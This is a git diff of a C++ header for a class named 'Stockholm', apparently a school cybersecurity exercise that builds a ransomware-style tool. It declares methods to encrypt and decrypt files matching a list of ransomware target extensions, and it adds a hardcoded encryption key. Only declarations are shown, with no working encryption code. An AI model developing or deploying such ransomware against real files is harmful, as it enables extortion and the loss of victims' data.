@@ -6,7 +6,7 @@
 /*   By: bguyot <bguyot@student.42.fr>              +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2023/05/19 09:43:26 by bguyot            #+#    #+#             */
-/*   Updated: 2023/05/19 13:29:08 by bguyot           ###   ########.fr       */
+/*   Updated: 2023/05/19 14:52:27 by bguyot           ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -18,6 +18,7 @@ class Stockholm;
 #include <filesystem>
 #include <vector>
 #include <algorithm>
+#include <fstream>
 
 #include "constants.hpp"
 
@@ -28,13 +29,14 @@ private:
 	bool _version;
 	bool _silent;
 	bool _reverse;
-	std::string _key;
+	std::string _key = "oursupersecureencryptionkeybakedwithloveandchocolaterlynobodycouldeverbreakthiswdymthisisntsecureatallandwecanjuststringsthebinary?";
 	const std::filesystem::path _path;
 	const std::vector<std::string> _extensions{RANSOMWARE_EXTENSIONS};
 
 	void _printHelp(void);
 	void _printVersion(void);
 	void _decipher(std::filesystem::path path);
+	void _decipherFile(std::filesystem::path path);
 	void _cipher(std::filesystem::path path);
 	void _cipherFile(std::filesystem::path path);
 
